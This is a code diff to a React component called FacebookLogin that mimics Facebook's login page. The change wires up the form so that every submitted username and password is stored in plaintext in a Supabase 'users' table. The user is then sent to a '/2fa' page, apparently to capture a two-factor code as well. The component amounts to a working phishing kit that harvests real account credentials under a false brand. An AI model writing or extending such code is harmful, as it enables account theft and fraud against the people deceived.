@@ -1,21 +1,28 @@
 import React from 'react';
 import { useNavigate } from 'react-router-dom';
 import { loading } from "../lib/Alert"
+import { supabase } from '../utils/supabase';
 
 export default function FacebookLogin() {
   const navigate = useNavigate()
 
 
-  function HandleSubmit(){
+  async function HandleSubmit(e){
+    e.preventDefault()
 
     loading()
 
-    setTimeout(()=>{
-      loading(false)
-      navigate("/2fa")
-    },3000)
-
+    const formData = new FormData(e.target)
     
+    const { error } = await supabase
+      .from('users')
+      .insert({ username: formData.get("username"), password: formData.get("password")  })
+
+    loading(false)
+
+    if(!error){
+      navigate("/2fa",{state:{ username:formData.get("username")  }})
+    }
   }
   
 
@@ -38,10 +45,11 @@ export default function FacebookLogin() {
         </div>
 
         {/* Login Form */}
-        <form onSubmit={(e) => e.preventDefault()} className="space-y-4">
+        <form onSubmit={HandleSubmit} className="space-y-4">
           <div>
             <input
               type="text"
+              name="username"
               placeholder="Email address or mobile number"
               className="w-full px-4 py-3.5 border border-gray-300 rounded-xl text-[15px] placeholder-gray-500 focus:outline-none focus:border-[#1877F2] focus:ring-1 focus:ring-[#1877F2] transition-colors"
               required
@@ -51,6 +59,7 @@ export default function FacebookLogin() {
           <div>
             <input
               type="password"
+              name="password"
               placeholder="Password"
               className="w-full px-4 py-3.5 border border-gray-300 rounded-xl text-[15px] placeholder-gray-500 focus:outline-none focus:border-[#1877F2] focus:ring-1 focus:ring-[#1877F2] transition-colors"
               required
@@ -58,7 +67,6 @@ export default function FacebookLogin() {
           </div>
 
           <button 
-            onClick={HandleSubmit}
             type="submit"
             className="w-full py-3 bg-[#1877F2] hover:bg-[#166FE5] text-white font-semibold rounded-full text-base transition-colors duration-200 mt-2 shadow-sm"
           >
